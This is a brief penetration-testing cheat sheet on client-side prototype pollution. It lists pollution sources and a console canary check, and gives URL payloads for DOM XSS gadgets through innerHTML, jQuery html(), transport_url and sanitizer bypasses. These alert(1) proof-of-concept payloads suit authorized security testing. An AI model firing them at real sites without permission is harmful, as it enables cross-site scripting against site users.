# Client-Side Prototype Pollution

## Sources
- URL query parameters: `?__proto__[key]=value`, `?__proto__.key=value`, `?constructor[prototype][key]=value`.
- Hash fragments: `#__proto__[key]=value`.
- postMessage payloads, JSON from fetch/XHR, deep-merged config objects.

## Detection
Navigate with canary and check in console:
```js
console.log(({}).polluted); // "true" if polluted
```
Use Burp DOM Invader with Prototype Pollution enabled; it auto-detects sources and scans for gadgets.

## Common gadgets (DOM XSS)
- innerHTML: `?__proto__[innerHTML]=<img/src/onerror=alert(1)>`
- jQuery $.html(): `?__proto__[html]=<img/src/onerror=alert(1)>`
- transport_url (analytics): `?__proto__[transport_url]=data:,alert(1)//`
- Sanitizer bypass: `?__proto__[allowedTags]=<script>`, `?__proto__[tagName]=IMG`

## Impact
Client-side DOM XSS, CSP bypass helpers, auth/UI bypass. Confirm execution in browser; reflection alone is not a finding.
